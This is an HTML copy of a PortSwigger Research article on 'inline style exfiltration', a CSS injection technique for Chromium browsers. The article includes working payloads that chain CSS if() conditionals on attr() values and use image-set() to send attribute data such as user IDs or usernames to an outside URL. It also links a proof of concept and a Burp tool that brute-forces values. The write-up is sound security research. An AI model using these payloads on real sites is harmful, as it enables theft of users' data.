<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Inline Style Exfiltration: leaking data with chained CSS conditionals</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
  h1 { color: #00d9ff; margin-bottom: 0.5em; }
  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
  img { max-width: 100%; height: auto; border-radius: 8px; }
  a { color: #00d9ff; }
  p { margin-bottom: 1em; }
  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }

  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
  .article-elevator-btn:hover { background: rgba(10,14,39,1); }

</style>
</head>
<body>
  <h1>Inline Style Exfiltration: leaking data with chained CSS conditionals</h1>
  <div class="metadata">
    Source: PortSwigger Research | Date: 8/26/2025 | Lang: EN |
    <a href="https://portswigger.net/research/inline-style-exfiltration" target="_blank">Original Article</a>
  </div>
  <div class="content">
    <div><div>
    
    
    
<div>
    <p><img alt="Gareth Heyes" src="https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png" /></p>
</div>
    <ul>
        <li>
            <p><span></span><strong>Published: </strong>26 August 2025 at 12:54 UTC</p>
        </li>
        <li>
            <p><strong>Updated: </strong>27 August 2025 at 07:35 UTC</p>
        </li>
        <li>
        </li>
    </ul>
    <p><img src="https://portswigger.net/cms/images/f4/49/e20e-article-article.png" /><br /></p><p><b>I discovered how to use CSS to steal attribute data without selectors and stylesheet imports! This means you can now exploit CSS injection via style attributes! Learn how below:</b></p>
<p>Someone asked if you could steal data using inline styles. I initially dismissed the idea but then I was reminded of 
<a href="https://x.com/slonser_/status/1912060415296835961">Slonser's
</a> excellent technique of using the attr() and image-set() functions to steal data from the attribute. This method can steal an entire attribute provided you import a style sheet from your chosen domain. But this left me pondering what about without importing a stylesheet? Can you steal data just using inline styles?
</p><p>CSS introduced 
<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/if">if statements</a>, that's right this (not a) programming language now has conditionals. I was sure I could use this as a way to check the attribute value and make a background request to any domain I like without requiring a stylesheet import. I began crafting a vector:</p><p><code>&lt;div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); <br />else: url(/2));background:image-set(var(--steal))" title=1&gt;test&lt;/div&gt;
</code></p><p>But it didn't work. Then Slonser sent a snippet that did work and it turned out the if statement comparison requires double not single quotes:</p><p><code>&lt;div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1&gt;test&lt;/div&gt;</code></p><p>How quirky is CSS! I'm used to single and double quotes being interchangeable like JavaScript. So now we could make a request to an arbitrary domain using a background request and inline styles. The problem here is that you can only check one value but of course this (not a) programming language supports nested if statements! So you can chain them together and check for multiple values. This allows you to steal non-complex data such as user ids or usernames:</p>

<p><code>&lt;div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'&gt;&lt;/div&gt;</code></p><p>In the preceding example it can steal the data-uid attribute if it contains a value in the range of 1-10. So if you ever find yourself locked in a style attribute and need to steal the data of an attribute you can use our Custom Action in Burp Suite to brute force the required values! Note at the time of writing this technique only works on Chromium based browsers.
</p>

<p>Here's a video demonstrating stealing usernames from the data-username attribute using a <a href="https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda">Burp Custom Action</a>:</p><p><img src="https://portswigger.net/cms/images/54/99/de4f-article-inline-style-exfiltration-using-custom-actions-smaller.gif" alt="A demonstration of using a Custom Action to generate some HTML that can be used to steal data with inline styles." /><br /></p>


<p>Here is the code used in the video:</p><p><code>&lt;div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://portswigger.net/martin); else: if(style(--val:"zak"): url(https://portswigger.net/zak); else: url(https://portswigger.net/james))); background: image-set(var(--steal));' data-username="james"&gt;&lt;/div&gt;</code></p><p><a href="https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php">Proof of concept</a></p>


<h2>Update...</h2>

<p><a href="https://x.com/lukejahnke">Luke Jahnke</a> pointed out you can make a background request without the url() syntax. A plain string will do. This means the vector can be reduced
 to:</p>

<p><code>&lt;div style='--val:attr(title);--steal:if(style(--val:"1"): "/1"; else: "/2");background:image-set(var(--steal))' title=1&gt;test&lt;/div&gt;</code></p>
    <p><a href="https://portswigger.net/research/articles">Back to all articles</a></p>
</div></div>
  </div>
</body>
</html>